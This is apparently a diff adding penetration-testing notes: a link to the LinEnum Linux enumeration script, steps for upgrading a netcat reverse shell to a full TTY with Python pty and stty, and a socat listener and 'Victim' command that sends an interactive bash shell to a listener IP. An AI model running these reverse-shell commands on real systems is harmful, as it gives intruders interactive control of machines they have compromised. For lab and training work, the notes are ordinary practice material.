@@ -1,2 +1,32 @@
 # Script for enumirate linux from inside
 https://github.com/rebootuser/LinEnum/
+
+
+# Upgrade nc shell
+# --------------------------------------------------------------------- #
+# Using stty options
+## stty -a on kali, to know rows and columns number for step 3
+
+# 1) In reverse shell
+    $ python -c 'import pty; pty.spawn("/bin/bash")'
+    Ctrl-Z
+
+# 2) In Kali
+    $ stty raw -echo
+    $ fg
+
+# 3) In reverse shell
+    $ reset
+    $ export SHELL=bash
+    $ export TERM=xterm-256color
+    $ stty rows <num> columns <cols>
+
+# --------------------------------------------------------------------- #
+# Using socat
+# Listener:
+    socat file:`tty`,raw,echo=0 tcp-listen:<port>
+
+#Victim:
+    $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<listener_ip>:<port>
+
+# --------------------------------------------------------------------- #
